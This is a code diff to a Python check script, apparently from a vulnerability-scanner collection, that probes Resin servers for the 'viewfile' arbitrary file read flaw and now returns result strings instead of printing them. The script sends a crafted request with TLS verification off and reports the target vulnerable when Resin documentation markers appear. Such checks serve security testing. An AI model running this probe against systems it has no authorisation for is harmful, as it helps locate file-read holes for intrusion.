@@ -10,8 +10,6 @@ decompiled to view the Java source。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
 
 class resin_viewfile_fileread_BaseVerify:
     def __init__(self, url):
@@ -30,12 +28,12 @@ class resin_viewfile_fileread_BaseVerify:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"resin-doc" in req.text and r"caucho.server" in req.text:
-                    cprint("[+]存在resin viewfile 任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
-
+                    return "[+]存在resin viewfile 任意文件读取漏洞...(高危)\tpayload: "+vulnurl
+                else:
+                    return "[-]no vuln"
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-] ====>连接超时"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = resin_viewfile_fileread_BaseVerify(sys.argv[1])
     testVuln.run()
